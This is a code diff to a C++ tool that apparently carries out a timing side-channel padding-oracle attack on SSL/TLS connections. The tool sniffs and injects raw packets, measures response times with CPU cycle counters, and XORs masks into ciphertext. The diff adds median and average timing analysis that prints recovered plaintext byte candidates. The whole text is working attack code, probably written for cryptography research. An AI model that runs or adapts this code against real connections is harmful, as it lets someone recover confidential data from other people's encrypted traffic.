@@ -1,6 +1,7 @@
 #include <iostream>
 #include <cstring>
 #include <cstdlib>
+#include <cstdio>
 #include <netinet/udp.h>
 #include <netinet/tcp.h>
 #include <netinet/ip.h>
@@ -10,6 +11,7 @@
 #include <net/if.h>
 #include <map>
 #include <list>
+#include <algorithm>
 
 #include <x86intrin.h>
 
@@ -24,7 +26,7 @@ unsigned char * plaintext;
 
 const int blockSize = 16;
 int blockOffset = blockSize - 2;
-int samples = 1;
+int samples = 4;
 
 int sock_raw;
 struct sockaddr_in sin;
@@ -206,9 +208,14 @@ void RestartClient()
 	system("./sslclient &");
 }
 
+bool sortFunc(std::pair<unsigned short,uint64_t> & first, std::pair<unsigned short,uint64_t> & second)
+{
+	return first.second < second.second;
+}
+
 void ProcessStats()
 {
-	if(true)
+	if(false)
 	{
 		// Print stats
 		for(std::map<unsigned short,std::list<uint64_t> >::iterator it = maskCycles.begin(); it != maskCycles.end(); ++it)
@@ -220,6 +227,75 @@ void ProcessStats()
 			}
 		}
 	}
+
+	if(true)
+	{
+     		std::list<std::pair<unsigned short,uint64_t> > avgList;
+		std::list<std::pair<unsigned short,uint64_t> > medianList;           
+                for(std::map<unsigned short,std::list<uint64_t> >::iterator it = maskCycles.begin(); it != maskCycles.end(); ++it)
+                {
+                        //std::cerr << "Mask: " << std::hex << it->first << std::dec << std::endl;
+			uint64_t total = 0;
+			it->second.sort();
+			int mIndexStart = samples / 2;
+			int mIndexEnd = mIndexStart;
+			if(!(samples % 2))
+			{
+				mIndexStart--;
+			}
+
+			int mIndex = 0;
+			uint64_t median = 0;
+                        for(std::list<uint64_t>::iterator lit = it->second.begin(); lit != it->second.end(); ++lit)
+                        {
+				if(mIndex == mIndexStart || mIndex == mIndexEnd)
+				{
+					median += (*lit);
+				}
+				mIndex++;
+                                //std::cerr << "Sample: " << (*lit) << std::endl;
+				total += (*lit);
+                        }
+
+			if(!(samples % 2))
+			{
+				median = median / ((uint64_t)2);
+			}
+
+			medianList.push_back(std::pair<unsigned short,uint64_t>(it->first,median));
+			avgList.push_back(std::pair<unsigned short,uint64_t>(it->first,total/((uint64_t)samples)));
+                }
+
+		avgList.sort(sortFunc);
+		medianList.sort(sortFunc);
+
+		unsigned short padTarget = blockSize - blockOffset - 1;
+		unsigned short padTarget2 = padTarget + 1;
+
+		if(firstPhase)
+		{
+			padTarget |= (padTarget << 8);
+			padTarget2 |= (padTarget2 << 8);
+		}
+
+		std::list<std::pair<unsigned short,uint64_t> >::iterator it = avgList.begin();
+		std::list<std::pair<unsigned short,uint64_t> >::iterator mit = medianList.begin();		
+		for(int i = 0; i < 10; ++i)
+		{
+			std::cerr << "Mask: " << std::hex << it->first << std::dec << std::endl;
+			std::cerr << "Avg: " << it->second << std::endl;
+			std::cerr << "Plaintext: " << std::hex << ((it->first)^padTarget) << std::dec << std::endl;
+			std::cerr << "Plaintext2: " << std::hex << ((it->first)^padTarget2) << std::dec << std::endl;
+			it++;
+
+			std::cerr << "Mask: " << std::hex << mit->first << std::dec << std::endl;
+                        std::cerr << "Median: " << mit->second << std::endl;
+                        std::cerr << "Plaintext: " << std::hex << ((mit->first)^padTarget) << std::dec << std::endl;
+                        std::cerr << "Plaintext2: " << std::hex << ((mit->first)^padTarget2) << std::dec << std::endl;
+                        mit++;
+		}
+        }
+
 	maskCycles.clear();
 	exit(1);
 }
@@ -227,7 +303,7 @@ void ProcessStats()
 void ProcessCycles()
 {
 	uint64_t diff = recvCycle - sendCycle;
-	std::cerr << "Cycle count: " << diff << std::endl;	
+	//std::cerr << "Cycle count: " << diff << std::endl;	
 
 	unsigned short mask = 0;
 	if(firstPhase)
@@ -244,10 +320,12 @@ void ProcessCycles()
 			// for now increment both, since it should be padding
 			xorMask[blockOffset]++;
 			xorMask[blockOffset+1]++;
+			//std::cerr << ".";
 		}
 
 		if(xorMask[blockOffset] == 0)
 		{
+			std::cerr << std::endl;
 			ProcessStats();
 		}
 	}
@@ -389,6 +467,7 @@ void SendPacket(unsigned char * data, int size)
 	{
 		std::cerr << "Error sending packet." << std::endl;
 	}
+	//sendCycle = __rdtsc();
 	packetSent = true;
 	skipPackets = 2;
 }
@@ -584,6 +663,14 @@ void ProcessPacket(unsigned char * data, int size)
 
 		unsigned char * payload = data + iphdrlen + tcph->doff*4;
                 int payloadSize = (size - tcph->doff*4 - iphdrlen);
+
+		/*std::cerr << "ctext: " << std::endl;
+		for(int i = 5; i < payloadSize; ++i)
+		{
+			fprintf(stderr,"%02X",payload[i]);
+		}
+		std::cerr << std::endl;
+		exit(1);*/
 
 		unsigned char * optional = ((unsigned char*)tcph)+20;
 		int optlen = (tcph->th_off-5)*4;
